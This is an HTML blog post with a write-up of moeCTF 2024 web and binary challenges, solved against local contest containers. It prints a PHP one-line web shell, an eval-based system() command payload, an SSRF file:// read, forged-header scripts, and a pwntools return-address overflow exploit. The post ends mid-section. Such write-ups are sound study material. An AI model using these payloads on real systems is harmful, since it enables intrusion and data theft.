@@ -1,0 +1,951 @@
+
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <title>moeCTF 2024 题解 | 雨宮ましろ&#39;s Blog</title>
+    <meta name="author" content="雨宮 ましろ" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>雨宮ましろ&#39;S BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雨宮ましろ&#39;S BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>moeCTF 2024 题解</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/11/1
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #ffa2c4">
+                    CTF
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="参赛感受"><a href="#参赛感受" class="headerlink" title="参赛感受"></a>参赛感受</h1><p>WebSocketReflectorX 的转发延迟实在是有点高，这对于做题而言似乎有些小难受，不知道明年是否能够解决？</p>
+<p>以及非常感谢强力队友 ChatGPT 在本次比赛中发挥的巨大作用（笑）。</p>
+<span id="more"></span>
+
+<h1 id="Web渗透测试与审计"><a href="#Web渗透测试与审计" class="headerlink" title="Web渗透测试与审计"></a>Web渗透测试与审计</h1><h2 id="00"><a href="#00" class="headerlink" title="00 -"></a>00 -</h2><h2 id="01-弗拉格之地的入口"><a href="#01-弗拉格之地的入口" class="headerlink" title="01 - 弗拉格之地的入口"></a>01 - 弗拉格之地的入口</h2><h2 id="02-垫刀之路01-MoeCTF？启动！"><a href="#02-垫刀之路01-MoeCTF？启动！" class="headerlink" title="02 - 垫刀之路01: MoeCTF？启动！"></a>02 - 垫刀之路01: MoeCTF？启动！</h2><h2 id="03-ez-http"><a href="#03-ez-http" class="headerlink" title="03 - ez_http"></a>03 - ez_http</h2><p>首先使用 WSRX 穿透，访问网站发现提示要使用 POST 方法进行访问：</p>
+<p><img src="https://s2.loli.net/2024/09/25/GhYdJvWS7cMbpwi.png"></p>
+<p>使用如下 Python 程序访问：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:33025/&#39;)
+print(r)
+</code></pre>
+<p>得知需要发送参数 <code>imou=sb</code> ：</p>
+<p><img src="https://s2.loli.net/2024/09/25/VYSzv8HiTXW1FqM.png"></p>
+<p>改成如下脚本：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:33025&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;)
+print(r.text)
+</code></pre>
+<p>又得知需要发送 GET 形式参数：</p>
+<p><img src="https://s2.loli.net/2024/09/25/GtYn2ud4UeTFIMg.png"></p>
+<p>改成如下脚本：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:330255?xt=大帅b&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;)
+print(r.text)
+</code></pre>
+<p>之后得知需要改 source：</p>
+<p><img src="https://s2.loli.net/2024/09/25/yKFVHwhO3Btor6z.png"></p>
+<p>参考了一下这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44953600/article/details/107515973">https://blog.csdn.net/weixin_44953600&#x2F;article&#x2F;details&#x2F;107515973</a>，得知 Referer 的存在。</p>
+<blockquote>
+<p><code>Referer</code>: Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referer</a></p>
+</blockquote>
+<p>改成如下脚本：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:330255?xt=大帅b&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;, headers = &#123;&#39;Referer&#39;:&#39;https://www.xidian.edu.cn/&#39;&#125;)
+print(r.text)
+</code></pre>
+<p>得知需要设置 cookie（吐槽一下，好多套娃 <code>- -&quot;&#39;</code>）：</p>
+<p><img src="https://s2.loli.net/2024/09/25/qgC5oK1rc6Omtp3.png"></p>
+<p>脚本更改为如下：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:33025?xt=大帅b&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;, headers = &#123;&#39;Referer&#39;:&#39;https://www.xidian.edu.cn/&#39;&#125;, cookies = &#123; &#39;user&#39; : &#39;admin&#39; &#125; )
+print(r.text)
+</code></pre>
+<p>然后又要改浏览器标识：</p>
+<p><img src="https://s2.loli.net/2024/09/25/Y6I8pmP7Q3yvFWL.png"></p>
+<p>脚本更改为如下：</p>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:33025?xt=大帅b&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;, headers = &#123; &#39;Referer&#39;:&#39;https://www.xidian.edu.cn/&#39;， &#39;User-Agent&#39; : &#39;MoeDedicatedBrowser&#39; &#125;, cookies = &#123; &#39;user&#39; : &#39;admin&#39; &#125; )
+print(r.text)
+</code></pre>
+<p>又要改成标识为本地请求？</p>
+<p><img src="https://s2.loli.net/2024/09/25/tidYMOuEaIknsXp.png"></p>
+<p>参考博客园上的这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/IMBlackMs/p/11272848.html">https://www.cnblogs.com/IMBlackMs/p/11272848.html</a>，添加 <code>X-Forwarded-For</code> 参数：</p>
+<blockquote>
+<p><code>X-Forwarded-For</code>：X-Forwarded-For（XFF）请求标头是一个事实上的用于标识通过代理服务器连接到 web 服务器的客户端的原始 IP 地址的标头。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-For</a></p>
+</blockquote>
+<pre><code class="language-python">import requests
+r = requests.post(&#39;http://127.0.0.1:33025?xt=大帅b&#39;, data = &#123; &#39;imoau&#39; : &#39;sb&#39; &#125;, headers = &#123; &#39;Referer&#39;:&#39;https://www.xidian.edu.cn/&#39;， &#39;User-Agent&#39; : &#39;MoeDedicatedBrowser&#39;, &#39;X-Forwarded-For&#39; : &#39;127.0.0.1&#39; &#125;, cookies = &#123; &#39;user&#39; : &#39;admin&#39; &#125; )
+print(r.text)
+</code></pre>
+<p>总算拿到 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/RSroUpLu6esAGNa.png"></p>
+<h2 id="04-ProveYourLove"><a href="#04-ProveYourLove" class="headerlink" title="04 - ProveYourLove"></a>04 - ProveYourLove</h2><p>打开是个奇怪的页面：</p>
+<p><img src="https://s2.loli.net/2024/09/25/DNVU1PLszndHwgy.png"></p>
+<p>直接填写表单提交似乎没啥用处，F12 开申。</p>
+<p>首先看到对表单提交次数有检查：</p>
+<pre><code>        document.getElementById(&#39;confessionForm&#39;).addEventListener(&#39;submit&#39;, function(event) &#123;
+            event.preventDefault(); // 阻止表单的默认提交行为
+
+            // 检查设备是否已提交过表白
+            if (localStorage.getItem(&#39;confessionSubmitted&#39;)) &#123;
+                alert(&#39;您已经提交过表白，不能重复提交。&#39;);
+                return;
+            &#125;
+</code></pre>
+<p>因为获取的是本地存储，所以可以每次提交过后直接在 F12 的 console 中输入如下命令进行绕过：</p>
+<pre><code class="language-javascript">localStorage.removeItem(&#39;confessionSubmitted&#39;)
+</code></pre>
+<p>接下来没有太看到存在什么漏洞，继续审计，发现网页上支持动态载入数据的部分（应该是这么叫吧？），其数据来源于路径 <code>/confession_count</code> ：</p>
+<pre><code class="language-javascript">        document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123;
+            // 获取当前表白份数
+            fetch(&#39;/confession_count&#39;)
+                .then(response =&gt; response.json())
+                .then(data =&gt; &#123;
+                    document.getElementById(&#39;confessionCount&#39;).textContent = data.count;
+                    document.getElementById(&#39;flag&#39;).textContent = data.flag;
+                    document.getElementById(&#39;Qixi_flag&#39;).textContent = data.Qixi_flag;
+                &#125;)
+                .catch(error =&gt; &#123;
+                    console.error(&#39;Error:&#39;, error);
+                &#125;);
+        &#125;);
+</code></pre>
+<p>访问这个路径确实可以看到 JSON 格式的结果，但似乎也没有别的了：</p>
+<p><img src="https://s2.loli.net/2024/09/25/7i8cRXmrDbe2FPQ.png"></p>
+<p>申了大半天没看出来有啥漏洞，最后看题目描述说 <code>300份才能证明你的爱</code> ，尝试编写如下 Python 脚本进行自动求爱：</p>
+<pre><code class="language-python">import requests
+
+data = &#39;&#39;&#39;&#123;
+    &quot;nickname&quot;:&quot;test&quot;,
+    &quot;user_gender&quot;:&quot;male&quot;,
+    &quot;target&quot;:&quot;test&quot;,
+    &quot;target_gender&quot;:&quot;male&quot;,
+    &quot;message&quot;:&quot;test&quot;,
+    &quot;anonymous&quot;:&quot;false&quot;
+&#125;&#39;&#39;&#39;
+
+headers = &#123;
+    &#39;Content-Type&#39;: &#39;application/json&#39;
+&#125;
+
+for i in range(300):
+    requests.post(&#39;http://127.0.0.1:41913/questionnaire&#39;, data = data, headers = headers)
+</code></pre>
+<p>运行结束后再访问页面（wsrx 的延迟似乎比想象中长不少，又或许是题目环境的限制，总之最后等了约莫半个多小时），获取 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/KBdx8lT5E1hpGgq.png"></p>
+<blockquote>
+<p>所以说这题的考点其实不是 Web 漏洞，而是自动化脚本编写？</p>
+<p>以及更痛苦的是打到一半容器被关了…似乎除了超时以外，请求超过 300 次也会关容器？</p>
+<p><img src="https://s2.loli.net/2024/09/25/LusBzYbGnv4UIa8.png"></p>
+</blockquote>
+<h2 id="05-弗拉格之地的挑战"><a href="#05-弗拉格之地的挑战" class="headerlink" title="05 - 弗拉格之地的挑战"></a>05 - 弗拉格之地的挑战</h2><p>进去之后是个朴素的指引界面：</p>
+<p><img src="https://s2.loli.net/2024/09/25/GynT8c395PMOoYe.png"></p>
+<p>跟着指引跳转，之后打开 F12 发现注释：</p>
+<p><img src="https://s2.loli.net/2024/09/25/qZhyn9rWMKcUVBL.png"></p>
+<p>二次跳转，提示通过“网络”传输，打开 <code>Network</code> ，在响应头里看到下一步的路径：</p>
+<p><img src="https://s2.loli.net/2024/09/25/DkadsYEhKZrRGAT.png"></p>
+<p>然后要求传一个 <code>a</code> 作为 get 参数：</p>
+<p><img src="https://s2.loli.net/2024/09/25/8usjJ4TyNGklQDg.png"></p>
+<p>接下来要传 <code>b</code> 作为 post 的参数：</p>
+<p><img src="https://s2.loli.net/2024/09/25/HyBXf2UOzAhS6pg.png"></p>
+<p>写 Python：</p>
+<pre><code class="language-python">r = requests.post(&#39;http://127.0.0.1:41665/flag3cad.php?a=114514&#39;, data = &#123; &#39;b&#39; : 1919810 &#125;)
+</code></pre>
+<p>接下来提示要改 Cookie：</p>
+<p><img src="https://s2.loli.net/2024/09/25/yWcCVH4KGX2f8Os.png"></p>
+<p>看了看响应头里说要设置 <code>verify</code> 这个字段：</p>
+<p><img src="https://s2.loli.net/2024/09/25/wB9ivJp8yQsdWKD.png"></p>
+<p>加上：</p>
+<pre><code class="language-python">r = requests.post(&#39;http://127.0.0.1:41665/flag3cad.php?a=114514&#39;, data = &#123; &#39;b&#39; : 1919810 &#125;, cookies = &#123; &#39;verify&#39; : &#39;admin&#39; &#125;)
+</code></pre>
+<p>得知需要继续前往下一个路径：</p>
+<p><img src="https://s2.loli.net/2024/09/25/pOYMhgfHltQmTzB.png"></p>
+<p>点开提示要我们伪造访问源：</p>
+<p><img src="https://s2.loli.net/2024/09/25/HatTm1Euj25d4iA.png"></p>
+<p>伪造一下 <code>Referer</code> 字段：</p>
+<pre><code class="language-python">r = requests.post(&#39;http://127.0.0.1:41665/flag4bbc.php&#39;, headers = &#123; &#39;Referer&#39; : &#39;http://localhost:8080/flag3cad.php?a=1&#39; &#125;)
+</code></pre>
+<p>发现需要 console：</p>
+<p><img src="https://s2.loli.net/2024/09/25/Ii5NSXnhGpaOP1x.png"></p>
+<p>重新打开 Burp Suite，Proxy-&gt;intercept 修改请求：</p>
+<p><img src="https://s2.loli.net/2024/09/25/mQE29cSx3ftLY7A.png"></p>
+<p>然后直接在 console 里改 button ID：</p>
+<p><img src="https://s2.loli.net/2024/09/25/ZwG8VmqIyrBESYL.png"></p>
+<p>查看 <code>console.log()</code> ：</p>
+<p><img src="https://s2.loli.net/2024/09/25/4AtTXqUK6PkLp3Y.png"></p>
+<p>继续前往下一步，先被嘲笑一番：</p>
+<p><img src="https://s2.loli.net/2024/09/25/21pkIvrdyNOZmPs.png"></p>
+<p>F12 申一下看到逻辑在 <code>checkValue()</code> 里：</p>
+<p><img src="https://s2.loli.net/2024/09/25/RTVZg5nb2QzrDs9.png"></p>
+<p>直接自己重写一个：</p>
+<pre><code class="language-javascript">function checkValue() &#123;
+    var content = document.forms[&quot;form&quot;][&quot;content&quot;].value;
+    if (content == &quot;I want flag&quot;) &#123;
+        return true;
+    &#125; else &#123;
+        return false;
+    &#125;
+&#125;
+</code></pre>
+<p>放到命令行里替换掉：</p>
+<p><img src="https://s2.loli.net/2024/09/25/KCGpQHw5ZfUsMkV.png"></p>
+<p>重新提交字符串，拿到第五截 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/wqCFiIVdluxtro8.png"></p>
+<p>来到下一关，经典的 PHP 代码审计：</p>
+<p><img src="https://s2.loli.net/2024/09/25/z1bDf6XAZTr2EiL.png"></p>
+<p><code>preg_match()</code> 在 PHP 中用作正则匹配，<code>/</code> 用以分割匹配模式，<code>/flag/</code> 表示匹配包含 <code>flag</code> 的字符串，而 <code>/flag/i</code> 的 <code>i</code> 表示忽视大小写，因此我们只需要把参数改为大写的 <code>FLAG</code> 即可：</p>
+<pre><code class="language-python">r = requests.post(&#39;http://127.0.0.1:41665/flag6diw.php?moe=FLAG&#39;, data = &#123; &#39;moe&#39; : &#39;FLAG&#39; &#125;)
+</code></pre>
+<p>拿到第六截 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/eg5MD3qwEJxOp9I.png"></p>
+<p>前往最后一关，只有一个最简单的 PHP 的 <code>eval()</code> ，这个函数的特性是会直接转换我们的输入为 PHP：</p>
+<p><img src="https://s2.loli.net/2024/09/25/aF6KcngyRz3kOAQ.png"></p>
+<p><code>eval()</code> 的特性使得我们可以直接在服务端执行 PHP 代码（大概如此？），所以我们只需要直接 POST 参数为 PHP 的 <code>system()</code> 就能直接 RCE：</p>
+<pre><code class="language-python">r = requests.post(&#39;http://127.0.0.1:41665/flag7fxxkfinal.php&#39;, data = &#123; &#39;what&#39; : &#39;&#39;&#39;system(&quot;ls&quot;);&#39;&#39;&#39; &#125; )
+r = requests.post(&#39;http://127.0.0.1:41665/flag7fxxkfinal.php&#39;, data = &#123; &#39;what&#39; : &#39;&#39;&#39;system(&quot;cat /flag7&quot;);&#39;&#39;&#39; &#125; )
+</code></pre>
+<p>拿到最后一截 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/YRqpPI8xkcOZBGy.png"></p>
+<p>最后合起来 base64 一下就行了。</p>
+<h2 id="06-ImageCloud前置"><a href="#06-ImageCloud前置" class="headerlink" title="06 - ImageCloud前置"></a>06 - ImageCloud前置</h2><p>下载附件，只有一个 <code>index.html</code> 和一个 <code>index.php</code> ，直接开审：</p>
+<pre><code class="language-php">&lt;?php
+$url = $_GET[&#39;url&#39;];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+$res = curl_exec($ch);
+
+$image_info = getimagesizefromstring($res);
+$mime_type = $image_info[&#39;mime&#39;];
+
+header(&#39;Content-Type: &#39; . $mime_type);
+
+curl_close($ch);
+
+echo $res;
+?&gt;
+</code></pre>
+<p>发现有个 SSRF 漏洞：这个 PHP 程序会直接将我们给的参数作为请求的链接进行访问，所以我们可以很容易读取服务器上的任意文件。</p>
+<p>例如使用 <code>file:</code> 协议：</p>
+<p><img src="https://s2.loli.net/2024/09/25/XTyCb1qv6PdQRHW.png"></p>
+<p>拿到 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/jzI1Gvu2fW5mTPS.png"></p>
+<h2 id="07-垫刀之路02-普通的文件上传"><a href="#07-垫刀之路02-普通的文件上传" class="headerlink" title="07 - 垫刀之路02: 普通的文件上传"></a>07 - 垫刀之路02: 普通的文件上传</h2><p>首先开 F12 审计，页面有两个按钮，一个是读取文件，一个是上传文件：</p>
+<p><img src="https://s2.loli.net/2024/09/26/FbCZedzh3qVTP8K.png"></p>
+<p>简单传个文件试试，发现会把文件内容 base64 编码后更新到页面里，并存放在服务器的 <code>uploads</code> 目录下：</p>
+<p><img src="https://s2.loli.net/2024/09/26/W73iom8yTqxkzLs.png"></p>
+<p>直接传个一句话木马上去：</p>
+<pre><code class="language-php">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;
+</code></pre>
+<p>然后访问 <code>/uploads/test.php?cmd=</code> 就能任意代码执行了，在环境变量里发现 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/26/VA92TIKb1dZh5cJ.png"></p>
+<h2 id="08-垫刀之路03-这是一个图床"><a href="#08-垫刀之路03-这是一个图床" class="headerlink" title="08 - 垫刀之路03: 这是一个图床"></a>08 - 垫刀之路03: 这是一个图床</h2><blockquote>
+<p>做题时参考了 <a target="_blank" rel="noopener" href="https://blog.csdn.net/jayq1/article/details/139420350">https://blog.csdn.net/jayq1/article/details/139420350</a>，学到很多O.o。</p>
+</blockquote>
+<p>F12 开审，和上一题不同的是这一次限制了文件后缀名只能是合法图片：</p>
+<p><img src="https://s2.loli.net/2024/09/26/WHsYtFQ6jnIguMd.png"></p>
+<p>因为是前端校验，所以直接 Burp Suite 启动！将原本的一句话木马后缀改成 <code>.png</code> ，拦截过了校验后发往 <code>upload.php</code> 的请求，再将后缀改成 <code>.php</code> （否则服务端不会执行）：</p>
+<blockquote>
+<p>似乎应当也能直接用 Python 伪造请求…？</p>
+</blockquote>
+<p><img src="https://s2.loli.net/2024/09/26/1TgOrdk4IE8blZa.png"></p>
+<p>然后就是快乐的拿 flag 时间了：</p>
+<p><img src="https://s2.loli.net/2024/09/26/pPimWbL6DxIAUFs.png"></p>
+<h2 id="09-垫刀之路04-一个文件浏览器"><a href="#09-垫刀之路04-一个文件浏览器" class="headerlink" title="09 - 垫刀之路04: 一个文件浏览器"></a>09 - 垫刀之路04: 一个文件浏览器</h2><p>进去是一个文件浏览器（FTP？）：</p>
+<p><img src="https://s2.loli.net/2024/09/26/Woh3C8QMkDmBs7I.png"></p>
+<p>可以直接目录穿越：</p>
+<p><img src="https://s2.loli.net/2024/09/26/P5u7a9ZMioGn3bX.png"></p>
+<p>给了个假 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/26/zm5xIibwYXQM3qj.png"></p>
+<p>随便开个奇怪的文件，通过报错信息得到源码路径：</p>
+<p><img src="https://s2.loli.net/2024/09/26/ha2oXR7T84SOIm9.png"></p>
+<p>简单审计一下，好像确实没啥别的漏洞了：</p>
+<p><img src="https://s2.loli.net/2024/09/26/QAN1FM9EIcB2mis.png"></p>
+<p>本来以为有啥别的技巧，翻了翻发现 flag 在 <code>/tmp</code> 目录下，感觉没啥必要在根目录再放一个假的 flag…</p>
+<p><img src="https://s2.loli.net/2024/09/26/MQ5SRatPIpHU8T9.png"></p>
+<h2 id="10-垫刀之路05-登陆网站"><a href="#10-垫刀之路05-登陆网站" class="headerlink" title="10 - 垫刀之路05: 登陆网站"></a>10 - 垫刀之路05: 登陆网站</h2><p>F12 开审，好像没啥明显的漏洞：</p>
+<p><img src="https://s2.loli.net/2024/09/26/z8Lg329EGqTMWFy.png"></p>
+<p>推测应该是 SQL 注入一类的，</p>
+<h1 id="二进制漏洞审计"><a href="#二进制漏洞审计" class="headerlink" title="二进制漏洞审计"></a>二进制漏洞审计</h1><h2 id="00-二进制漏洞审计入门指北"><a href="#00-二进制漏洞审计入门指北" class="headerlink" title="00 - 二进制漏洞审计入门指北"></a>00 - 二进制漏洞审计入门指北</h2><p>看完指北，直接开环境 nc 就行：</p>
+<p><img src="https://s2.loli.net/2024/09/25/STZwdA14uP7hikK.png"></p>
+<h2 id="01-NotEnoughTime"><a href="#01-NotEnoughTime" class="headerlink" title="01 - NotEnoughTime"></a>01 - NotEnoughTime</h2><p>NC 上去，发现是个定时解数学题：</p>
+<p><img src="https://s2.loli.net/2024/09/25/fMpHNaGXyjVRzOT.png"></p>
+<p>手写一个简单的 Parser，注意这里得按纯整数运算：</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+class Exp:
+    target = &#39;&#39;
+    port = 0
+    conn = None
+
+    def __init__(self, target: str, port: int = 0):
+        self.target = target
+        self.port = port
+
+    def Connect(self, is_remote: bool = False):
+        if is_remote:
+            self.conn = remote(self.target, self.port)
+        else:
+            self.conn = process(self.target)
+
+    def Attack(self):
+        self.conn.recvuntil(b&#39;Test start, you have only 30 seconds.&#39;)
+        while True:
+            ch = self.conn.recv(1)
+            if not (ch[0] &gt;= ord(&#39;0&#39;) and ch[0] &lt;= ord(&#39;9&#39;)):
+                continue
+
+            formula = ch
+            while True:
+                ch = self.conn.recv(1)
+                if ch != b&#39;=&#39;:
+                    if ch != b&#39;\n&#39;:
+                        formula += ch
+                        if ch == b&#39;/&#39;:
+                            formula += b&#39;/&#39;
+                else:
+                    break
+
+            print(formula)
+            res = eval(formula)
+            self.conn.sendline(str(int(res)))
+
+def exp_main(target: str, port: int = 0):
+    exp = Exp(target, port)
+    exp.Connect(is_remote = True)
+    exp.Attack()
+
+if __name__ == &#39;__main__&#39;:
+    exp_main(&#39;127.0.0.1&#39;, 43255)
+</code></pre>
+<p>拿到 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/9hnv5tGr6KyaXFp.png"></p>
+<h2 id="02-no-more-gets"><a href="#02-no-more-gets" class="headerlink" title="02 - no_more_gets"></a>02 - no_more_gets</h2><p>首先拖入 IDA 分析，有一个比较明显的 gets() 溢出：</p>
+<pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)
+&#123;
+  char s1[80]; // [rsp+0h] [rbp-A0h] BYREF
+  char s2[80]; // [rsp+50h] [rbp-50h] BYREF
+
+  init(argc, argv, envp);
+  arc4random_buf(s1, 80LL);
+  write(1, &quot;This is my own shell, enter the password or get out.\n&quot;, 0x36uLL);
+  gets(s2);
+  if ( !strncmp(s1, s2, 0x50uLL) )
+    my_shell();
+  else
+    write(1, &quot;Password wrong!\n&quot;, 0x11uLL);
+  return 0;
+&#125;
+</code></pre>
+<p>checksec 检查一下，没有保护，比较朴素：</p>
+<p><img src="https://s2.loli.net/2024/09/29/TMgxDXLHNKQzmR6.png"></p>
+<p>直接覆盖返回地址为 <code>my_shell()</code>:</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+class Exp:
+    target = &#39;&#39;
+    port = 0
+    conn = None
+
+    def __init__(self, target: str, port: int = 0):
+        self.target = target
+        self.port = port
+
+    def Connect(self, is_remote: bool = False):
+        if is_remote:
+            self.conn = remote(self.target, self.port)
+        else:
+            self.conn = process(self.target)
+
+    def Attack(self):
+        self.conn.recvuntil(b&quot;This is my own shell, enter the password or get out.\n&quot;)
+        self.conn.sendline(b&quot;A&quot; * 0x58 + p64(0x401176))
+        self.conn.interactive()
+
+def exp_main(target: str, port: int = 0):
+    exp = Exp(target, port)
+    exp.Connect(is_remote = True)
+    exp.Attack()
+
+if __name__ == &#39;__main__&#39;:
+    exp_main(&#39;127.0.0.1&#39;, 44851)
+</code></pre>
+<p>看着像成了，结果死了：</p>
+<p><img src="https://s2.loli.net/2024/09/29/4tERNhe9v3pizBc.png"></p>
+<p>查了查说是栈没对齐，加个 ret 就好了：</p>
+<pre><code class="language-python">from pwn import *
+
+context.log_level = &#39;debug&#39;
+
+class Exp:
+    target = &#39;&#39;
+    port = 0
+    conn = None
+
+    def __init__(self, target: str, port: int = 0):
+        self.target = target
+        self.port = port
+
+    def Connect(self, is_remote: bool = False):
+        if is_remote:
+            self.conn = remote(self.target, self.port)
+        else:
+            self.conn = process(self.target)
+
+    def Attack(self):
+        self.conn.recvuntil(b&quot;This is my own shell, enter the password or get out.\n&quot;)
+        self.conn.sendline(b&quot;A&quot; * 0x58 + p64(0x4011A4) + p64(0x401176))
+        self.conn.interactive()
+
+def exp_main(target: str, port: int = 0):
+    exp = Exp(target, port)
+    exp.Connect(is_remote = True)
+    exp.Attack()
+
+if __name__ == &#39;__main__&#39;:
+    exp_main(&#39;127.0.0.1&#39;, 44851)
+</code></pre>
+<p>拿到 shell：</p>
